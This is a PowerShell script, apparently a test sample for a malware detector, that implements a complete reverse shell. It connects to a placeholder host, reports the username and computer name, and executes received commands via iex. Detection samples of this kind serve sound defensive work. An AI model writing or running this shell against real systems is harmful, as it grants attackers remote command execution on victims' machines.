# Simple reverse shell, should be flagged as malicious
# Setup the payload
$IP = "127.0.0.1"
$port = "1337"

# Create the payload
$shell = New-Object System.Net.Sockets.TCPClient($IP,$port)
$stream = $shell.GetStream()
$encoding = [System.Text.Encoding]::Unicode
$bytes = $encoding.GetBytes("PowerShell running as " + $env:username + " on " + $env:computername + "`n")
$stream.Write($bytes, 0, $bytes.Length)

# Create a thread to read the output
$send = {
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = $encoding.GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $x = $encoding.GetBytes($sendback2)
    $stream.Write($x,0,$x.Length)
    $stream.Flush()
  }
  $shell.Close()
}

# Start the thread
$handle = [System.Threading.Thread]::new($send)
$handle.start()

# Keep the program running
while($handle.IsAlive){Start-sleep -seconds 1}
